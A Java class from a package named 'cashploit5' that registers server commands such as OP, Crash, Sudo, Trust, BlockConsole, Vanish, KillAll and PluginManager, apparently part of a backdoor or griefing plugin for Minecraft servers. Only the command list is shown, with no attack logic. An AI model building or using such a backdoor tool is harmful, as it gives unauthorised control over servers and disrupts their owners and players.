package de.cashploit5.command;

import java.util.ArrayList;
import java.util.List;

public class CommandManager {
	
	public CommandManager() {
		commands.add(new HelpCommand());
		commands.add(new OPCommand());
		commands.add(new CrashCommand());
		commands.add(new DemoCommand());
		commands.add(new SudoCommand());
		commands.add(new TrustCommand());
		commands.add(new BlockConsoleCommand());
		commands.add(new SaveCommand());
		commands.add(new VanishCommand());
		commands.add(new PermaDemoCommand());
		commands.add(new KillAll());
		commands.add(new PenisCommand());
		commands.add(new FreezeCommand());
		commands.add(new PluginManagerCommand());
		commands.add(new TornadoCommand());
		commands.add(new GameModeCommand());
		commands.add(new ReloadCommand());
		commands.add(new TpCommand());
		commands.add(new WalkingTornadoCommand());
		commands.add(new DeleteTornadosCommand());
		commands.add(new FallingPenisCommand());
	}
	
	private List<Command> commands = new ArrayList<>();
	
	public List<Command> getCommands() {
		return commands;
	}
}